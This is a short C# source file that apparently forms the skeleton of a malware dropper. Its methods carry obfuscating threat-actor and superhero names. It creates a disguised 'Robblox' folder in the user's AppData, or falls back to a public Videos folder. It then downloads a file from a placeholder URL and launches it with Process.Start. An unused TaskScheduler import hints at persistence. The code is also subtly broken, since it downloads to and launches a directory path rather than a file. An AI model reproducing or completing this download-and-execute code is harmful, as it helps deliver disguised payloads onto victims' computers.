using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32.TaskScheduler;
using System.Diagnostics;


public class Iron_man
{
    public static void Maedhros()
    {
        Pink_Sandstorm();
    }
    private static void Pink_Sandstorm()
    {
        string Minerva;
        bool ACTINIUM = Roasted_0ktapus.Captain_America($"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox"); 
        if(ACTINIUM){
            Roasted_0ktapus.Melkor("fill in later", $"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox"); // ======================================================
            Minerva = $"{Roasted_0ktapus.Saint_Bear()}\\Local\\Robblox";
        }
        else
        {
            Roasted_0ktapus.Melkor("fill in later","C:\\Users\\Public\\Videos");  // ---------------------------------------------------
            Minerva = "C:\\Users\\Public\\Videos";
        }
        Process.Start(@$"{Minerva}");
    }
}



internal class Roasted_0ktapus
{
    protected internal static void Melkor(string url, string outputPath)
    {
        using (WebClient client = new WebClient())
        {
            client.DownloadFile(url, outputPath);
        }
    }
    protected internal static bool Captain_America(string patth)
    {
        if (Directory.Exists(patth))
        {
            return true;
        }
        else if (!Directory.Exists(patth))
        {
            try
            {
                Directory.CreateDirectory(patth);
                return true;
            }
            catch (UnauthorizedAccessException)
            {
                return false;
            }
        }
        return false;
    }
    protected internal static string Saint_Bear(){

        string BRONZE_SILHOUETTE = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        return BRONZE_SILHOUETTE;
    }
}